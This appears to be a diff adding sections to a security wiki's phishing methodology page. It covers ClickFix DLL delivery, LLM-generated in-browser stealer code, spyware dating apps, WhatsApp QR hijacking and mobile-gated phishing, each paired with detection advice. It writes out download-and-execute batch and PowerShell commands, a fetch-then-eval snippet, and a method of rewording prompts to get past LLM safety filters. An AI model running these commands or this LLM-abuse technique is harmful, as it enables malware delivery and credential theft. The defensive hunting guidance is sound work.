@@ -526,6 +526,22 @@ Commodity crews offset the cost of high-touch ops with mass attacks that turn **
   ```
 * Hunt for LOLBins frequently abused by first-stage loaders (e.g. `regsvr32`, `curl`, `mshta`).
 
+### ClickFix DLL delivery tradecraft (fake CERT update)
+* Lure: cloned national CERT advisory with an **Update** button that displays step-by-step “fix” instructions. Victims are told to run a batch that downloads a DLL and executes it via `rundll32`.
+* Typical batch chain observed:
+  ```cmd
+  echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
+  echo timeout /t 10
+  echo rundll32.exe "%TEMP%\notepad2.dll",notepad
+  ```
+  * `Invoke-WebRequest` drops the payload to `%TEMP%`, a short sleep hides network jitter, then `rundll32` calls the exported entrypoint (`notepad`).
+* The DLL beacons host identity and polls C2 every few minutes. Remote tasking arrives as **base64-encoded PowerShell** executed hidden and with policy bypass:
+  ```powershell
+  powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
+  ```
+  * This preserves C2 flexibility (server can swap tasks without updating the DLL) and hides console windows. Hunt for PowerShell children of `rundll32.exe` using `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression` together.
+* Defenders can look for HTTP(S) callbacks of the form `...page.php?tynor=<COMPUTER>sss<USER>` and 5-minute polling intervals after DLL load.
+
 ---
 
 ## AI-Enhanced Phishing Operations
@@ -541,6 +557,44 @@ Attackers now chain **LLM & voice-clone APIs** for fully personalised lures and 
 • Add **dynamic banners** highlighting messages sent from untrusted automation (via ARC/DKIM anomalies).  
 • Deploy **voice-biometric challenge phrases** for high-risk phone requests.  
 • Continuously simulate AI-generated lures in awareness programmes – static templates are obsolete.
+
+See also – agentic browsing abuse for credential phishing:
+
+{{#ref}}
+ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
+{{#endref}}
+
+See also – AI agent abuse of local CLI tools and MCP (for secrets inventory and detection):
+
+{{#ref}}
+ai-agent-abuse-local-ai-cli-tools-and-mcp.md
+{{#endref}}
+
+## LLM-assisted runtime assembly of phishing JavaScript (in-browser codegen)
+
+Attackers can ship benign-looking HTML and **generate the stealer at runtime** by asking a **trusted LLM API** for JavaScript, then executing it in-browser (e.g., `eval` or dynamic `<script>`).
+
+1. **Prompt-as-obfuscation:** encode exfil URLs/Base64 strings in the prompt; iterate wording to bypass safety filters and reduce hallucinations.
+2. **Client-side API call:** on load, JS calls a public LLM (Gemini/DeepSeek/etc.) or a CDN proxy; only the prompt/API call is present in static HTML.
+3. **Assemble & exec:** concatenate the response and execute it (polymorphic per visit):
+
+```javascript
+fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
+  .then(r=>r.json())
+  .then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
+```
+
+4. **Phish/exfil:** generated code personalises the lure (e.g., LogoKit token parsing) and posts creds to the prompt-hidden endpoint.
+
+**Evasion traits**
+- Traffic hits well-known LLM domains or reputable CDN proxies; sometimes via WebSockets to a backend.
+- No static payload; malicious JS exists only after render.
+- Non-deterministic generations produce **unique** stealers per session.
+
+**Detection ideas**
+- Run sandboxes with JS enabled; flag **runtime `eval`/dynamic script creation sourced from LLM responses**.
+- Hunt for front-end POSTs to LLM APIs immediately followed by `eval`/`Function` on returned text.
+- Alert on unsanctioned LLM domains in client traffic plus subsequent credential POSTs.
 
 ---
 
@@ -573,6 +627,46 @@ clipboard-hijacking.md
 mobile-phishing-malicious-apps.md
 {{#endref}}
 
+### Romance-gated APK + WhatsApp pivot (dating-app lure)
+* The APK embeds static credentials and per-profile “unlock codes” (no server auth). Victims follow a fake exclusivity flow (login → locked profiles → unlock) and, on correct codes, are redirected into WhatsApp chats with attacker-controlled `+92` numbers while spyware runs silently.
+* Collection starts even before login: immediate exfil of **device ID**, contacts (as `.txt` from cache), and documents (images/PDF/Office/OpenXML). A content observer auto-uploads new photos; a scheduled job re-scans for new documents every **5 minutes**.
+* Persistence: registers for `BOOT_COMPLETED` and keeps a **foreground service** alive to survive reboots and background evictions.
+
+### WhatsApp device-linking hijack via QR social engineering
+* A lure page (e.g., fake ministry/CERT “channel”) displays a WhatsApp Web/Desktop QR and instructs the victim to scan it, silently adding the attacker as a **linked device**.
+* Attacker immediately gains chat/contact visibility until the session is removed. Victims may later see a “new device linked” notification; defenders can hunt for unexpected device-link events shortly after visits to untrusted QR pages.
+
+### Mobile‑gated phishing to evade crawlers/sandboxes
+Operators increasingly gate their phishing flows behind a simple device check so desktop crawlers never reach the final pages. A common pattern is a small script that tests for a touch-capable DOM and posts the result to a server endpoint; non‑mobile clients receive HTTP 500 (or a blank page), while mobile users are served the full flow.
+
+Minimal client snippet (typical logic):
+
+```html
+<script src="/static/detect_device.js"></script>
+```
+
+`detect_device.js` logic (simplified):
+
+```javascript
+const isMobile = ('ontouchstart' in document.documentElement);
+fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
+  .then(()=>location.reload());
+```
+
+Server behaviour often observed:
+- Sets a session cookie during the first load.
+- Accepts `POST /detect {"is_mobile":true|false}`.
+- Returns 500 (or placeholder) to subsequent GETs when `is_mobile=false`; serves phishing only if `true`.
+
+Hunting and detection heuristics:
+- urlscan query: `filename:"detect_device.js" AND page.status:500`
+- Web telemetry: sequence of `GET /static/detect_device.js` → `POST /detect` → HTTP 500 for non‑mobile; legitimate mobile victim paths return 200 with follow‑on HTML/JS.
+- Block or scrutinize pages that condition content exclusively on `ontouchstart` or similar device checks.
+
+Defence tips:
+- Execute crawlers with mobile‑like fingerprints and JS enabled to reveal gated content.
+- Alert on suspicious 500 responses following `POST /detect` on newly registered domains.
+
 ## References
 
 - [https://zeltser.com/domain-name-variations-in-phishing/](https://zeltser.com/domain-name-variations-in-phishing/)
@@ -580,6 +674,10 @@ mobile-phishing-malicious-apps.md
 - [https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
 - [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
 - [2025 Unit 42 Global Incident Response Report – Social Engineering Edition](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
+- [Silent Smishing – mobile-gated phishing infra and heuristics (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
+- [The Next Frontier of Runtime Assembly Attacks: Leveraging LLMs to Generate Phishing JavaScript in Real Time](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
+- [Love? Actually: Fake dating app used as lure in targeted spyware campaign in Pakistan](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
+- [ESET GhostChat IoCs and samples](https://github.com/eset/malware-ioc/tree/master/ghostchat)
 
 {{#include ../../banners/hacktricks-training.md}}
 
